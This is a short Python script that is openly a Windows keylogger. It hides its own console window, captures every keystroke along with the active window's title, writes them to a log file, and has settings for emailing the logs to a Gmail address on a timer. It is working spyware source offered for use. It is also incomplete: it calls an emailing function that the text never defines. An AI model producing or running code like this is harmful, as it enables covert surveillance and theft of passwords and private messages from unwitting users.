#This Project Has Been Made By Rohan Das
import sys
import win32api,pythoncom
import pyHook,os,time,random,smtplib,string,base64


t="";pics_names=[]


#Note: You have fill out this form, if you want to send the results to your pc.


#########Settings########

yourgmail=""                                        #What is your gmail?
yourgmailpass=""                                    #What is your gmail password
sendto=""                                           #Where should I send the logs to? (any email address)
interval=60                                         #Time to wait before sending data to email (in seconds)

########################

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()



def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


Hide()

def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.HookKeyboard()

start_time = time.time()

pythoncom.PumpMessages()
